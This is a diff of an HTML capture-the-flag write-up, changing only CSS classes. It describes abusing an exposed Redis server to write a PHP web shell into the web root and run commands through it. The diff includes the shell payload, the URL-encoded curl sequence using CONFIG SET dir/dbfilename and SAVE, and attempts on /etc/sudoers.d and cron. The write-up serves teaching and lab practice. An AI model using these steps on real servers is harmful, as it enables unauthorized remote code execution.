@@ -40,7 +40,7 @@
                     <p>Googling around for various ways to abuse Redis, the main thing I found was to use the "save database" functionality to write a new file to the file system.</p>
                     <p>The db save is in redis format, so it has some binary characters at the beginning and end.  Best bet will be to encode some crlf before/after whatever I want and look for a forgiving interpetation of the file.</p>
                     <p>The system doens't have ssh client installed, so I can't drop an ssh key to login as root.  </p>
-                    <p>When I drop a file into /etc/sudoers.d, sudoers complains about format do to the binary at the top</p>
+                    <p>When I drop a file into <span class="question cmd-sur">/etc/sudoers.d</span>, sudoers complains about format do to the binary at the top</p>
                     <p>I try dropping cron jobs into various locations without much luck.  Doesn't look like cron is running.  (Likely standard in container?)</p>
                     <div class="polaroid-rotate-right">
                         <div class="polaroid-surround">
@@ -51,12 +51,12 @@
                         </div>
                     </div>
                     <p>Well...  For this challenge, I don't need to get root (though it would be neat).  I just need to look at the index page.  So let's try dumping a php file.</p>
-                    <p>URL encode the following string: <span class="command">"\n\n\n&lt;?php system($_GET['cmd']); ?&gt;\n\n"</span></p>
+                    <p>URL encode the following string: <span class="cmd cmd-sur">"\n\n\n&lt;?php system($_GET['cmd']); ?&gt;\n\n"</span></p>
                     <p>After a couple of tries to get syntax just right, I dropped a new php file that would take an arg and execute raw command.  I then used this to cat the index file.</p>
-                    <p>Clear the existing redis values with command  <span class="command">curl http://localhost/maintenance.php?cmd=flushall</span></p>
-                    <p>Set the encoded value with <span class="command">curl http://localhost/maintenance.php?cmd=set,command,%22%0D%0A%0D%0A%0D%0A%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%0D%0A%0D%0A%22%0D%0A</span></p>
-                    <p>Save to the apache working directory with <span class="command">curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/</span>, then <span class="command">curl http://localhost/maintenance.php?cmd=config,set,dbfilename,jeremy.php</span>, and finally <span class="command">curl http://localhost/maintenance.php?cmd=save</span></p>
-                    <p>Send a command to the new page <span class="command">curl --output - http://localhost/jeremy.php?cmd=cat+index.php</span></p>
+                    <p>Clear the existing redis values with command  <span class="cmd cmd-sur">curl http://localhost/maintenance.php?cmd=flushall</span></p>
+                    <p>Set the encoded value with <span class="cmd cmd-sur">curl http://localhost/maintenance.php?cmd=set,command,%22%0D%0A%0D%0A%0D%0A%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%0D%0A%0D%0A%22%0D%0A</span></p>
+                    <p>Save to the apache working directory with <span class="cmd cmd-sur">curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/</span>, then <span class="cmd cmd-sur">curl http://localhost/maintenance.php?cmd=config,set,dbfilename,jeremy.php</span>, and finally <span class="cmd cmd-sur">curl http://localhost/maintenance.php?cmd=save</span></p>
+                    <p>Send a command to the new page <span class="cmd cmd-sur">curl --output - http://localhost/jeremy.php?cmd=cat+index.php</span></p>
 
                 </div>
 
